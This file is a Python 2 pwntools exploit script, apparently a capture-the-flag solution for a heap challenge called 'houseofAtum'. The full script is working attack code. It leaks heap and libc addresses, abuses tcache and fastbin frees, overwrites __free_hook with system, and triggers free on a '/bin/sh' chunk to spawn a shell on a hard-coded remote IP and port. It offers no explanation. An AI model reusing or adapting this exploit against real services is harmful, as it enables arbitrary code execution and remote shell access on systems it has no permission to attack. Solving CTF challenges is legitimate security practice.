#! /usr/bin/python2

from pwn import *
import sys


def exploit():
    gdb_command = '''
        breakrva 0xe86
    '''
    alloc('0')
    alloc(p64(0) * 7 + p64(0x11))
    delete(1, 'y')
    for i in range(6):
        delete(0, 'n')
    show(0)
    r.recvuntil('Content:')
    raw = r.recv(6)
    heap_addr = u64(raw.ljust(8, '\x00'))
    log.info('Heap addr: ' + hex(heap_addr))

    delete(0, 'y')
    gdb.attach(r, gdb_command)
    alloc(p64(heap_addr - 0x20))
    alloc('1')

    delete(0, 'y')
    alloc(p64(0) + p64(0x91))

    for i in range(7):
        delete(1, 'n')

    delete(1, 'y')
    SIGN = 'THE_END'
    edit(0, 'a' * (0x10 - len(SIGN)) + SIGN)
    show(0)
    r.recvuntil(SIGN)
    raw = r.recv(6)
    main_arena = u64(raw.ljust(8, '\x00')) - 96
    if LOCAL:
        libc_addr = main_arena - 0x39fc20
        system_addr = libc_addr + 0x3fa51
        free_hook_addr = libc_addr + 0x3a18c8
    else:
        libc_addr = main_arena - 0x3ebc40
        system_addr = libc_addr + 0x4f440
        free_hook_addr = libc_addr + 0x3ed8e8
    log.info('Libc addr: ' + hex(libc_addr))

    # gdb.attach(r, gdb_command)
    edit(0, '/bin/sh\x00' + p64(0x51) + p64(free_hook_addr - 0x10))
    alloc('0')
    delete(1, 'y')
    alloc(p64(system_addr))
    r.sendlineafter('Your choice:', '3')
    r.sendlineafter('Input the idx:', '0')

    r.interactive()


def alloc(content):
    r.sendlineafter('Your choice:', '1')
    r.sendafter('Input the content:', content)


def edit(idx, content):
    r.sendlineafter('Your choice:', '2')
    r.sendlineafter('Input the idx:', str(idx))
    r.sendafter('Input the content:', content)


def delete(idx, clear):
    r.sendlineafter('Your choice:', '3')
    r.sendlineafter('Input the idx:', str(idx))
    r.sendlineafter('Clear?(y/n):', clear)


def show(idx):
    r.sendlineafter('Your choice:', '4')
    r.sendlineafter('Input the idx:', str(idx))


if __name__ == '__main__':
    context.terminal = ['gnome-terminal', '-e']
    if len(sys.argv) == 1:
        exit()
    if sys.argv[1] == 'remote':
        r = remote('60.205.224.216', 9999)
        LOCAL = False
    elif sys.argv[1] == 'local':
        # r = process('./houseofAtum', env={'LD_PRELOAD': './libc.so.6'})
        r = process('./houseofAtum')
        LOCAL = True
    else:
        exit()
    exploit()
